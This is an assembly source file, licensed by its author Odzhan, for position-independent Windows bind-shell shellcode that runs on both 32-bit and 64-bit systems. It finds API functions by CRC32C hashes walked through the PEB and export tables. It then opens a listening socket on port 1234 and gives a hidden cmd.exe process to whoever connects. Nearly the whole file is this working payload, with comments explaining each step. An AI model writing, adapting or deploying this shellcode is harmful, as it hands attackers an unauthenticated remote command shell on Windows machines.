;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;    

    bits   32

    push   ebx
    push   ebp
    push   edi
    push   esi    
    jmp    rc_l0
rc_l1:
    pop    esi
    xor    ecx, ecx
    mov    cl, (get_api - cfg_data)
    dec    eax
    lea    ebp, [esi+ecx]
    
    mov    cl, (rc_l2 - cfg_data) & 0xFF
    mov    ch, (rc_l2 - cfg_data) >> 8
    dec    eax
    lea    edx, [esi+ecx]

    call   edx
    pop    esi
    pop    edi
    pop    ebp
    pop    ebx
    ret
rc_l0:
    call   rc_l1
cfg_data:
    db     1 ; ok 
    dd     0xA452DBF7   ; LoadLibraryA
    db     2 ; ok
    dd     0xC9854299   ; WSAStartup
    db     6 ; ok
    dd     0x93192D14   ; WSASocketA
    db     3 ; ok 
    dd     0x17D94F96   ; bind
    db     2 ; ok
    dd     0xD23387B0   ; listen
    db     3 ; ok
    dd     0x97060069   ; accept        
    db     10 ; ok
    dd     0xE4B134B4   ; CreateProcessA 
    db     2 ; ok
    dd     0xDDB22F93   ; WaitForSingleObject
    db     1 ; ok
    dd     0x3CE9170E   ; closesocket
    db     1 ; ok
    dd     0x3CE9170E   ; closesocket    
; in:  esi = s
; out: eax = crc32c(s)
;   
crc32cx:
    push   ecx 
    push   edx 
      
    xor    eax, eax          ; eax = 0
    cdq                      ; edx = 0
crc_l0x:
    lodsb                    ; al = *s++ | 0x20
    or     al, 0x20
    xor    dl, al            ; crc ^= c
    push   8
    pop    ecx    
crc_l1x:
    shr    edx, 1            ; crc >>= 1
    jnc    crc_l2x
    xor    edx, 0x82F63B78
crc_l2x:
    loop   crc_l1x
    cmp    al, 0x20          ; until al==0
    jnz    crc_l0x
    xchg   eax, edx
    
    pop    edx
    pop    ecx
    ret

; in:  ebp = base of module to search
;      esi = hash to find
;
; out: ecx = api address resolved in EAT
;
search_expxx:
    push   edi
    push   ebx
    push   edx
    push   esi
    
    ; edx += IMAGE_DOS_HEADER.e_lfanew
    add    edx, [ebp+3ch]
    
    ; ecx = VirtualAddress
    mov    ecx, [ebp+edx+28h]
    jecxz  exp_l2x
    
    ; save hash to find
    push   esi
    
    ; esi = Name
    mov    esi, [ebp+ecx+0ch]
    dec    eax
    add    esi, ebp
    call   crc32cx
    xchg   eax, edi

    ; edx = AddressOfFunctions
    mov    esi, [ebp+ecx+1ch]
    dec    eax
    add    esi, ebp
    ; esi = AddressOfNames      
    mov    edx, [ebp+ecx+20h]
    dec    eax
    add    edx, ebp    
    ; ebx = AddressOfNameOrdinals
    mov    ebx, [ebp+ecx+24h]
    dec    eax
    add    ebx, ebp    
    ; ecx = NumberOfNames
    mov    ecx, [ebp+ecx+18h]
    ; pop hash to find
    pop    eax
    jecxz  exp_l2x
    
    push   ebx    ; save AddressOfNameOrdinals
    push   esi    ; save AddressOfFunctions
    xchg   eax, ebx
exp_l1x:
    mov    esi, [edx+4*ecx-4]
    ; esi = RVA2VA(esi, ebp)   
    dec    eax
    add    esi, ebp
    ; add hash of dll string
    call   crc32cx
    add    eax, edi
    ; found match?
    cmp    eax, ebx
    loopne exp_l1x
    
    pop    esi
    pop    ebx
    jne    exp_l2x
    
    ; get ordinal
    movzx  ebx, word [ebx+2*ecx]
    ; get rva
    mov    ecx, [esi+4*ebx]
    dec    eax
    add    ecx, ebp
exp_l2x:
    pop    esi
    pop    edx
    pop    ebx
    pop    edi
    ret
    
; LPVOID get_api(DWORD hash);
get_api:
    lodsb                   ; al = arg count
    movzx  eax, al
    push   eax
    lodsd                   ; eax = crc32c    
    push   ebx
    push   edi
    push   esi
    push   ebp
    
    xchg   eax, esi
    
    xor    ebx, ebx
    mul    ebx
    mov    bl, 30h
    dec    eax
    jns    gapi_l0x

    db     64h              ; fs:
    mov    edi, [ebx]
    mov    edi, [edi+12]
    mov    edi, [edi+12]
    mov    bl, 18h
    mov    dl, 50h
    jmp    gapi_l2x
gapi_l0x:
    mov    dl, 60h
    db     65h              ; gs:
    dec    eax
    mov    edi, [edx]
    mov    edi, [edi+24]
    mov    edi, [edi+16]
    jmp    gapi_l2x

gapi_l1x:
    call   search_expxx 
    
    dec    eax
    test   ecx, ecx
    jnz    gapi_l3x
    
    dec    eax
    mov    edi, [edi]     ; dte->InMemoryOrderLinks.Flink
gapi_l2x:
    dec    eax
    mov    ebp, [edi+ebx] ; dte->DllBase
    
    dec    eax
    test   ebp, ebp
    jnz    gapi_l1x
    push   ebp
    pop    ecx
gapi_l3x:
    pop    ebp
    pop    esi
    pop    edi
    pop    ebx
    ; pop arg count for x64
    pop    edx
    xor    eax, eax
    dec    eax
    jns    gapi_l5x
    jmp    ecx
    
    bits   64
gapi_l5x:
    mov    r12d, edx
    mov    r11, rcx
    
    ; pop return address
    pop    r15
    
    ;no arg?
    test   r12d, r12d
    jz     gapi_l6x
    
    sub    r12d, 1
    pop    rcx
    ; 1 arg?
    jz     gapi_l6x

    sub    r12d, 1    
    pop    rdx
    ; 2 arg?
    jz     gapi_l6x

    sub    r12d, 1    
    pop    r8
    ; 3 arg
    jz     gapi_l6x
    ; 4 or more
    pop    r9
    sub    r12d, 1      
gapi_l6x:
    ; create homespace for rcx,rdx,r8 and r9
    sub    rsp, 20h
    call   r11
    ; release homespace and remove arguments
    lea    rsp, [rsp+8*r12+20h]
    push   r15
    ret
    
    bits   32    

rc_l2:    
int3
    add    esp, -512    
    push   esp
    pop    edi
    scasd               ; skip 4

    ; LoadLibraryA ("ws2_32");
    xor    eax, eax
    cdq
    push   eax ; alloc 4 or 8 bytes
    push   eax ; alloc 4 or 8 bytes
    push   esp
    pop    edx
    mov    eax, ~'32'
    not    eax
    mov    dword[edx+4], eax
    mov    dword[edx], 'ws2_'
    push   edx    
    call   ebp
    pop    eax ; free 4 or 8 bytes
    pop    eax ; free 4 or 8 bytes
    
    ; WSAStartup (MAKEWORD(2,0), &wsa);
    push   edi         ; &wsa
    push   2           ; MAKEWORD(2, 0)
    call   ebp
    test   eax, eax
    jnz    xit
    
    ; WSASocket (AF_INET, SOCK_STREAM, IPPROTO_IP, NULL, 0, 0);
    push   eax         ; 0
    push   eax         ; 0
    push   eax         ; NULL
    push   eax         ; IPPROTO_IP
    push   1           ; SOCK_STREAM
    push   2           ; AF_INET 
    call   ebp
    test   eax, eax
    js     xit
    
    push   eax         ; put s on stack
    xchg   eax, ebx    ; ebx = s

    ; bind (s, (struct sockaddr*)&sa, sizeof(sa));
    push   16          ; sizeof(sa)
    push   edi         ; &sa

    mov    eax, ~0xD2040002 & 0xFFFFFFFF  ; 1234, AF_INET 
    not    eax
    stosd
    
    mov    eax, ~0x00000000 & 0xFFFFFFFF  ; 
    not    eax
    stosd
    
    xor    eax, eax
    stosd
    stosd
    
    push   ebx         ; s
    call   ebp
    test   eax, eax
    jnz    cls_s
    
    ; listen (s, 0);
    push   eax
    push   ebx
    call   ebp
    test   eax, eax
    jnz    cls_s
        
    ; accept (s, 0, 0);
    push   eax
    push   eax
    push   ebx
    call   ebp
    test   eax, eax
    js     cls_s
    
    push   eax ; put r on stack
    xchg   eax, ebx
    
    ; memset (&si, 0, sizeof(si));
    push   esp
    pop    edi
    scasd ; skip r
    
    push   edi    
    push   68
    pop    eax       ; si.cb = sizeof(si); 
    stosd
    mov    al, 64
    xchg   eax, ecx
    xor    eax, eax
    rep    stosb
    pop    edi
    push   edi
    
    dec    eax
    js     rc_l9x
    mov    cl, 24
rc_l9x:    
    dec    eax
    lea    edi, [edi+ecx+56] ; 56 for 32, 80 for x64

    mov    cl, 3
rc_l6x:    
    mov    [edi], ebx  ; si.hStdInput  = s
    dec    eax         ; advance 4 or 8 depending on mode
    scasd
    loop   rc_l6x
    
    xor    eax, eax
    dec    eax
    js     rc_l10x
    mov    cl, 16
    
rc_l10x:    
    pop    edx
    
    ;int3
    
    ; CreateProcess (NULL, "cmd", NULL, NULL, 
    ;     TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    inc    dword[edx+ecx+45]
    ;mov    dword[edx+44], 100h ;STARTF_USESTDHANDLES
    mov    eax, ~'cmd'
    not    eax
    push   edi
    stosd 
    pop    eax
    push   edi         ; &pi         
    push   edx         ; &si   
    xor    ecx, ecx    ; ecx = NULL

    push   8
    pop    edx
    shl    edx, 24     ; edx = 0x08000000
    
    push   ecx         ; NULL
    push   ecx         ; NULL
    push   edx         ; CREATE_NO_WINDOW
    push   1           ; TRUE, has to be 1 for NT
    push   ecx         ; NULL
    push   ecx         ; NULL    
    push   eax         ; "cmd", 0
    push   ecx         ; NULL
    call   ebp
    neg    eax
    jns    cls_r
    
    ; WaitForSingleObject (pi.hProcess, INFINITE);
    push   eax         ; INFINITE
    mov    eax, [edi]
    push   eax         ; pi.hProcess
    call   ebp
cls_r:
    ; closesocket (s);
    call   ebp      
cls_s:
    ; closesocket (s);
    call   ebp
xit:    
int3
    sub    esp, -512
    ;mov eax, [fs:0x34]
    ret    
